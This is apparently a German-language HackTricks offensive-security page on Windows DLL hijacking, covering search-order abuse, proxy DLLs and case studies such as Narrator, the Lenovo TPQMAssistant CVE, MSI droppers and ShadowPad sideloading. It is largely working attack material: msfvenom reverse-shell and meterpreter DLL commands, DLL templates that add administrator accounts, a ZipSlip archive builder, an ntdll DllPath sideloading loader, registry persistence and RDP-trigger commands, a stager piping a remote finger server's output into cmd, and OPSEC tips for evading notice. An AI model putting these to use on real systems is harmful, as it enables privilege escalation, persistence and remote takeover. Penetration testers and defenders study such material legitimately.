# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Grundlegende Informationen

DLL Hijacking beinhaltet, eine vertrauenswürdige Anwendung dazu zu bringen, eine bösartige DLL zu laden. Dieser Begriff umfasst mehrere Taktiken wie **DLL Spoofing, Injection, and Side-Loading**. Es wird hauptsächlich für code execution, das Erreichen von persistence und, seltener, privilege escalation verwendet. Trotz des hier gezeigten Fokus auf Escalation bleibt die Methode des Hijackings über die Ziele hinweg gleich.

### Häufige Techniken

Mehrere Methoden werden für DLL hijacking eingesetzt, deren Effektivität vom DLL-Ladeverhalten der Anwendung abhängt:

1. **DLL Replacement**: Ersetzen einer legitimen DLL durch eine bösartige, optional unter Verwendung von DLL Proxying, um die Funktionalität der ursprünglichen DLL beizubehalten.
2. **DLL Search Order Hijacking**: Platzieren der bösartigen DLL in einem Suchpfad, der vor dem legitimen liegt, und Ausnutzen des Suchmusters der Anwendung.
3. **Phantom DLL Hijacking**: Erstellen einer bösartigen DLL, die eine Anwendung lädt, weil sie glaubt, es handle sich um eine benötigte, nicht existente DLL.
4. **DLL Redirection**: Ändern von Suchparametern wie %PATH% oder .exe.manifest / .exe.local Dateien, um die Anwendung auf die bösartige DLL zu lenken.
5. **WinSxS DLL Replacement**: Ersetzen der legitimen DLL durch ein bösartige Pendant im WinSxS-Verzeichnis, eine Methode, die oft mit DLL side-loading in Verbindung steht.
6. **Relative Path DLL Hijacking**: Platzieren der bösartigen DLL in einem vom Benutzer kontrollierten Verzeichnis zusammen mit der kopierten Anwendung, ähnlich den Binary Proxy Execution-Techniken.

> [!TIP]
> Für eine Schritt-für-Schritt-Kette, die HTML staging, AES-CTR configs und .NET implants auf DLL sideloading aufsetzt, siehe den Workflow unten.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Fehlende DLLs finden

Die gebräuchlichste Methode, fehlende DLLs in einem System zu finden, ist das Ausführen von [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) von Sysinternals und das **Setzen der folgenden 2 Filter**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

und einfach die **File System Activity** anzeigen:

![](<../../../images/image (153).png>)

Wenn Sie allgemein nach **missing dlls** suchen, lassen Sie dies für einige **Sekunden** laufen.\
Wenn Sie nach einer **missing dll innerhalb einer bestimmten ausführbaren Datei** suchen, sollten Sie einen weiteren Filter setzen wie z. B. "Process Name" "contains" `<exec name>`, das Programm ausführen und die Ereigniserfassung stoppen.

## Exploiting Missing Dlls

Um Privilegien zu escalaten, ist unsere beste Chance, eine **DLL zu schreiben, die ein privilegierter Prozess zu laden versucht**, an einem **Ort**, an dem sie gesucht wird. Daher können wir entweder eine **DLL in einen Ordner schreiben**, in dem die **DLL vor** dem Ordner, der die **original DLL** enthält, gesucht wird (seltenes Szenario), oder wir können in einen Ordner schreiben, in dem die DLL gesucht wird, während die originale **DLL in keinem Ordner existiert**.

### DLL-Suchreihenfolge

**In der** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **finden Sie, wie DLLs genau geladen werden.**

Windows-Anwendungen suchen nach DLLs, indem sie eine Reihe vordefinierter Suchpfade in einer bestimmten Reihenfolge durchlaufen. Das Problem des DLL hijacking entsteht, wenn eine schädliche DLL strategisch in einem dieser Verzeichnisse platziert wird, sodass sie vor der authentischen DLL geladen wird. Eine Lösung zur Vermeidung besteht darin, sicherzustellen, dass die Anwendung absolute Pfade verwendet, wenn sie auf die benötigten DLLs verweist.

Sie können die **DLL search order auf 32-bit** Systemen unten sehen:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Das ist die **Standard-**Suchreihenfolge mit **SafeDllSearchMode** aktiviert. Wenn sie deaktiviert ist, rückt das aktuelle Verzeichnis auf Platz zwei. Um diese Funktion zu deaktivieren, erstellen Sie den Registry-Wert **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** und setzen Sie ihn auf 0 (Standard ist aktiviert).

Wenn die [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) Funktion mit **LOAD_WITH_ALTERED_SEARCH_PATH** aufgerufen wird, beginnt die Suche im Verzeichnis des ausführbaren Moduls, das **LoadLibraryEx** lädt.

Beachten Sie schließlich, dass **eine DLL mit einem absoluten Pfad angegeben geladen werden kann statt nur mit dem Namen**. In diesem Fall wird diese DLL **nur in diesem Pfad** gesucht (falls die DLL Abhängigkeiten hat, werden diese so gesucht, als wären sie nur anhand des Namens geladen worden).

Es gibt noch andere Möglichkeiten, die Suchreihenfolge zu verändern, die ich hier nicht erläutern werde.

### Eine beliebige Dateischreiboperation in einen missing-DLL hijack verketten

1. Verwenden Sie **ProcMon**-Filter (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`), um DLL-Namen zu sammeln, die der Prozess abfragt, aber nicht finden kann.
2. Wenn das Binary nach Zeitplan/als service läuft, wird das Ablegen einer DLL mit einem dieser Namen in das **application directory** (Suchreihenfolge Eintrag #1) beim nächsten Start geladen. In einem .NET-Scanner-Fall suchte der Prozess beispielsweise nach `hostfxr.dll` in `C:\samples\app\` bevor die echte Kopie aus `C:\Program Files\dotnet\fxr\...` geladen wurde.
3. Erstelle eine Payload-DLL (z. B. reverse shell) mit beliebigem Export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Wenn Ihr Primitive ein ZipSlip-style arbitrary write ist, erstellen Sie ein ZIP, dessen Eintrag aus dem Extraktionsverzeichnis ausbricht, sodass die DLL im App-Ordner landet:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Liefere das Archiv in den überwachten Posteingang/Freigabe; wenn die geplante Aufgabe den Prozess neu startet, lädt dieser die bösartige DLL und führt deinen Code als Service-Konto aus.

### Erzwingen von sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Eine fortgeschrittene Methode, den DLL-Suchpfad eines neu erstellten Prozesses deterministisch zu beeinflussen, besteht darin, das DllPath-Feld in RTL_USER_PROCESS_PARAMETERS zu setzen, wenn der Prozess mit ntdlls nativen APIs erstellt wird. Indem hier ein vom Angreifer kontrolliertes Verzeichnis angegeben wird, kann ein Zielprozess, der eine importierte DLL per Name auflöst (kein absoluter Pfad und ohne Verwendung der sicheren Ladeflags), dazu gezwungen werden, eine bösartige DLL aus diesem Verzeichnis zu laden.

Kernidee
- Erstelle die Prozessparameter mit RtlCreateProcessParametersEx und gib einen benutzerdefinierten DllPath an, der auf deinen kontrollierten Ordner zeigt (z. B. das Verzeichnis, in dem dein dropper/unpacker liegt).
- Erstelle den Prozess mit RtlCreateUserProcess. Wenn das Ziel-Binary eine DLL per Name auflöst, konsultiert der Loader während der Auflösung diesen bereitgestellten DllPath, wodurch zuverlässiges sideloading ermöglicht wird, selbst wenn die bösartige DLL nicht im selben Verzeichnis wie das Ziel-EXE liegt.

Hinweise/Einschränkungen
- Dies betrifft den zu erstellenden Child-Prozess; es unterscheidet sich von SetDllDirectory, das nur den aktuellen Prozess beeinflusst.
- Das Ziel muss eine DLL per Name importieren oder mit LoadLibrary laden (kein absoluter Pfad und ohne Verwendung von LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs und hartkodierte absolute Pfade können nicht gehijackt werden. Forwarded exports und SxS können die Präzedenz ändern.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Vollständiges C-Beispiel: Erzwingen von sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Betriebsbeispiel
- Platziere eine bösartige xmllite.dll (die die erforderlichen Funktionen exportiert oder auf die echte weiterleitet) in deinem DllPath-Verzeichnis.
- Starte ein signiertes Binary, das dafür bekannt ist, xmllite.dll per Name nachzuschlagen, und verwende die obige Technik. Der Loader löst den Import über das angegebene DllPath auf und sideloads your DLL.

Diese Technik wurde in freier Wildbahn beobachtet, um mehrstufige sideloading-Ketten zu betreiben: Ein anfänglicher Launcher legt eine Hilfs-DLL ab, welche dann ein Microsoft-signed, hijackable Binary mit einem benutzerdefinierten DllPath startet, um das Laden der DLL des Angreifers aus einem staging directory zu erzwingen.


#### Exceptions on dll search order from Windows docs

Certain exceptions to the standard DLL search order are noted in Windows documentation:

- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.

### Privilegien eskalieren

**Voraussetzungen**:

- Finde einen Prozess, der unter **anderen Privilegien** läuft oder laufen wird (horizontaler oder lateraler Bewegung), dem **eine DLL fehlt**.
- Stelle sicher, dass **Schreibzugriff** für jedes **Verzeichnis** vorhanden ist, in dem nach der **DLL** **gesucht werden wird**. Dieser Ort kann das Verzeichnis der ausführbaren Datei oder ein Verzeichnis im Systempfad sein.

Ja, die Voraussetzungen sind schwer zu finden, da es **standardmäßig ziemlich ungewöhnlich ist, eine privilegierte ausführbare Datei ohne eine DLL zu finden** und es noch **ungewöhnlicher ist, Schreibrechte in einem Ordner des Systempfads zu haben** (das ist standardmäßig nicht möglich). Aber in falsch konfigurierten Umgebungen ist dies möglich.\
Falls du Glück hast und die Voraussetzungen erfüllst, kannst du dir das [UACME](https://github.com/hfiref0x/UACME) Projekt ansehen. Auch wenn das **Hauptziel des Projekts die Umgehung von UAC ist**, findest du dort möglicherweise einen **PoC** für Dll hijacking für die Windows-Version, den du verwenden kannst (wahrscheinlich musst du nur den Pfad des Ordners ändern, in dem du Schreibrechte hast).

Beachte, dass du deine Berechtigungen in einem Ordner überprüfen kannst, indem du:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Und **prüfe die Berechtigungen aller Verzeichnisse im PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Du kannst auch die Imports einer ausführbaren Datei und die Exports einer dll überprüfen mit:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Für eine vollständige Anleitung, wie man **Dll Hijacking missbraucht, um Privilegien zu eskalieren** mit Schreibrechten in einem **System Path folder**, siehe:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automatisierte Tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) wird prüfen, ob du Schreibrechte in einem Ordner innerhalb des system PATH hast.\
Andere interessante automatisierte Tools, um diese Schwachstelle zu entdecken, sind **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ und _Write-HijackDll._

### Beispiel

Falls du ein ausnutzbares Szenario findest, ist eine der wichtigsten Maßnahmen, um es erfolgreich auszunutzen, **eine dll zu erstellen, die mindestens alle Funktionen exportiert, die das ausführbare Programm daraus importieren wird**. Beachte außerdem, dass Dll Hijacking nützlich sein kann, um [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) oder von[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Du findest ein Beispiel dafür, **wie man eine gültige dll erstellt**, in dieser Untersuchung zu dll hijacking mit Fokus auf dll hijacking zur Ausführung: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Außerdem findest du im **nächsten Abschnitt** einige **basic dll codes**, die als **Templates** nützlich sein könnten oder um eine **dll mit nicht benötigten exportierten Funktionen** zu erstellen.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Im Grunde ist ein **Dll proxy** eine Dll, die in der Lage ist, **deinen bösartigen Code beim Laden auszuführen**, aber auch die Funktionalität bereitzustellen und wie erwartet zu funktionieren, indem sie **alle Aufrufe an die echte Bibliothek weiterleitet**.

Mit dem Tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) oder [**Spartacus**](https://github.com/Accenture/Spartacus) kannst du tatsächlich **ein Executable angeben und die Library auswählen**, die du proxify möchtest, und eine proxified dll erzeugen oder **die Dll angeben** und eine proxified dll generieren.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Erhalte einen meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Erstelle einen Benutzer (x86 — ich habe keine x64-Version gesehen):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Dein eigenes

Beachte, dass in mehreren Fällen die Dll, die du kompilierst, **export several functions** muss, die vom victim process geladen werden; wenn diese Funktionen nicht existieren, wird das **binary won't be able to load** sie und der **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL-Beispiel mit Benutzererstellung</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternativ C DLL with thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Fallstudie: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe prüft beim Start weiterhin eine vorhersehbare, sprachspezifische Lokalisierungs-DLL, die hijacked werden kann für arbitrary code execution und persistence.

Wichtige Fakten
- Abfragepfad (aktuelle Builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy-Pfad (ältere Builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Wenn an dem OneCore-Pfad eine beschreibbare, vom Angreifer kontrollierte DLL existiert, wird sie geladen und `DllMain(DLL_PROCESS_ATTACH)` ausgeführt. Es sind keine Exports erforderlich.

Erkennung mit Procmon
- Filter: `Process Name is Narrator.exe` und `Operation is Load Image` oder `CreateFile`.
- Starte Narrator und beobachte den Versuch, den oben genannten Pfad zu laden.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Ein naiver Hijack spricht/hervorhebt die UI. Um still zu bleiben, enumerate beim Attach die Narrator-Threads, öffne den Hauptthread (`OpenThread(THREAD_SUSPEND_RESUME)`) und `SuspendThread` ihn; setze die Arbeit in deinem eigenen Thread fort. Siehe PoC für vollständigen Code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Mit obigen Einstellungen lädt das Starten von Narrator die abgelegte DLL. Auf dem secure desktop (Anmeldebildschirm) STRG+WIN+ENTER drücken, um Narrator zu starten; deine DLL läuft als SYSTEM auf dem secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP zum Host, auf dem Anmeldebildschirm STRG+WIN+ENTER drücken, um Narrator zu starten; deine DLL läuft als SYSTEM auf dem secure desktop.
- Die Ausführung stoppt, wenn die RDP-Session schließt — inject/migrate daher zügig.

Bring Your Own Accessibility (BYOA)
- Du kannst einen eingebauten Accessibility Tool (AT)-Registry-Eintrag klonen (z. B. CursorIndicator), ihn so bearbeiten, dass er auf eine beliebige Binärdatei/DLL zeigt, importieren und dann `configuration` auf diesen AT-Namen setzen. Das erlaubt beliebige Ausführung über das Accessibility-Framework.

Notes
- Schreiben unter `%windir%\System32` und das Ändern von HKLM-Werten erfordert Admin-Rechte.
- gesamte Payload-Logik kann in `DLL_PROCESS_ATTACH` leben; es werden keine Exports benötigt.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Dieser Fall demonstriert **Phantom DLL Hijacking** in Lenovos TrackPoint Quick Menu (`TPQMAssistant.exe`), getrackt als **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` läuft täglich um 09:30 Uhr im Kontext des angemeldeten Benutzers.
- **Directory Permissions**: Schreibbar für `CREATOR OWNER`, wodurch lokale Benutzer beliebige Dateien ablegen können.
- **DLL Search Behavior**: Versucht zuerst `hostfxr.dll` aus seinem Arbeitsverzeichnis zu laden und protokolliert "NAME NOT FOUND", falls fehlen, was auf Vorrang der lokalen Verzeichnissuche hinweist.

### Exploit Implementation

Ein Angreifer kann eine bösartige `hostfxr.dll`-Stub in dasselbe Verzeichnis legen und damit die fehlende DLL ausnutzen, um Codeausführung im Kontext des Benutzers zu erreichen:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Angriffsablauf

1. Als Standardbenutzer kopiere `hostfxr.dll` nach `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Warte, bis die geplante Aufgabe um 9:30 AM im Kontext des aktuellen Benutzers ausgeführt wird.
3. Wenn ein Administrator zum Zeitpunkt der Ausführung der Aufgabe angemeldet ist, läuft die bösartige DLL in der Sitzung des Administrators mit medium integrity.
4. Führe gängige UAC bypass techniques aus, um von medium integrity auf SYSTEM-Privilegien zu eskalieren.

## Fallstudie: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Angreifer koppeln häufig MSI-based droppers mit DLL Side-Loading, um payloads unter einem vertrauenswürdigen, signierten Prozess auszuführen.

Chain overview
- Der Benutzer lädt die MSI herunter. Eine CustomAction läuft still während der GUI-Installation (z. B. LaunchApplication oder eine VBScript-Aktion) und rekonstruiert die nächste Stufe aus eingebetteten Ressourcen.
- Der Dropper schreibt eine legitime, signierte EXE und eine bösartige DLL in dasselbe Verzeichnis (Beispielpaar: Avast-signed wsc_proxy.exe + vom Angreifer kontrollierte wsc.dll).
- Wenn die signierte EXE gestartet wird, lädt die Windows DLL-Suchreihenfolge wsc.dll zuerst aus dem Arbeitsverzeichnis und führt den Code des Angreifers unter einem signierten Parent aus (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction-Tabelle:
- Suche nach Einträgen, die ausführbare Dateien oder VBScript ausführen. Beispiel für ein verdächtiges Muster: LaunchApplication, das eine eingebettete Datei im Hintergrund ausführt.
- Untersuche in Orca (Microsoft Orca.exe) die Tabellen CustomAction, InstallExecuteSequence und Binary.
- Eingebettete/aufgeteilte payloads in der MSI CAB:
- Administrative Extraktion: msiexec /a package.msi /qb TARGETDIR=C:\out
- Oder verwende lessmsi: lessmsi x package.msi C:\out
- Suche nach mehreren kleinen Fragmenten, die von einer VBScript CustomAction zusammengefügt und entschlüsselt werden. Üblicher Ablauf:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktisches sideloading mit wsc_proxy.exe
- Lege diese beiden Dateien in denselben Ordner:
- wsc_proxy.exe: legitim signierter Host (Avast). Der Prozess versucht, wsc.dll anhand des Namens aus seinem Verzeichnis zu laden.
- wsc.dll: attacker DLL. Wenn keine spezifischen exports benötigt werden, kann DllMain ausreichen; andernfalls erstelle eine proxy DLL und leite die benötigten exports an die genuine library weiter, während der payload in DllMain ausgeführt wird.
- Erstelle ein minimales DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Für Export-Anforderungen verwende ein Proxy-Framework (z. B. DLLirant/Spartacus), um eine Forwarding-DLL zu erzeugen, die außerdem dein Payload ausführt.

- Diese Technik beruht auf der DLL-Name-Auflösung durch das Host-Binary. Wenn der Host absolute Pfade oder sichere Load-Flags verwendet (z. B. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), kann das Hijack fehlschlagen.
- KnownDLLs, SxS und forwarded exports können die Reihenfolge beeinflussen und müssen bei der Auswahl des Host-Binaries und des Export-Sets berücksichtigt werden.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point beschrieb, wie Ink Dragon ShadowPad mit einer dreiteiligen Triade einsetzt, um sich unter legitimer Software zu tarnen und das Kern-Payload verschlüsselt auf der Festplatte zu halten:

1. **Signed host EXE** – Anbieter wie AMD, Realtek oder NVIDIA werden missbraucht (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Die Angreifer benennen das ausführbare Programm um, damit es wie ein Windows-Binary aussieht (z. B. `conhost.exe`), die Authenticode-Signatur bleibt jedoch gültig.
2. **Malicious loader DLL** – neben der EXE mit einem erwarteten Namen abgelegt (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). Die DLL ist üblicherweise ein MFC-Binary, das mit dem ScatterBrain-Framework obfuskiert ist; ihre einzige Aufgabe ist es, das verschlüsselte Blob zu finden, zu entschlüsseln und ShadowPad reflectively zu mappen.
3. **Encrypted payload blob** – oft als `<name>.tmp` im selben Verzeichnis gespeichert. Nachdem das entschlüsselte Payload gemappt wurde, löscht der Loader die TMP-Datei, um forensische Spuren zu vernichten.

Tradecraft-Hinweise:

* Das Umbenennen der signierten EXE (während das originale `OriginalFileName` im PE-Header erhalten bleibt) ermöglicht es, sich als Windows-Binary auszugeben und gleichzeitig die Vendor-Signatur zu behalten. Repliziere Ink Dragon’s Vorgehen, `conhost.exe`-ähnliche Binaries abzulegen, die in Wirklichkeit AMD/NVIDIA-Utilities sind.
* Da das ausführbare Programm weiterhin als vertrauenswürdig gilt, müssen die meisten Allowlisting-Kontrollen nur deine bösartige DLL neben ihm zulassen. Konzentriere dich darauf, den Loader-DLL anzupassen; das signierte Parent kann in der Regel unverändert laufen.
* ShadowPad’s Decryptor erwartet, dass das TMP-Blob neben dem Loader liegt und beschreibbar ist, damit es die Datei nach dem Mappen nullen kann. Halte das Verzeichnis bis zum Laden des Payloads beschreibbar; sobald sich das Payload im Speicher befindet, kann die TMP-Datei aus OPSEC-Gründen sicher gelöscht werden.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operatoren koppeln DLL sideloading mit LOLBAS, sodass das einzige kundenspezifische Artefakt auf der Festplatte die bösartige DLL neben der vertrauenswürdigen EXE ist:

- **Remote command loader (Finger):** Hidden PowerShell startet `cmd.exe /c`, holt Befehle von einem Finger-Server und piped sie an `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` holt TCP/79-Text; `| cmd` führt die Server-Antwort aus, wodurch Operatoren den Server-seitigen Second Stage rotieren können.

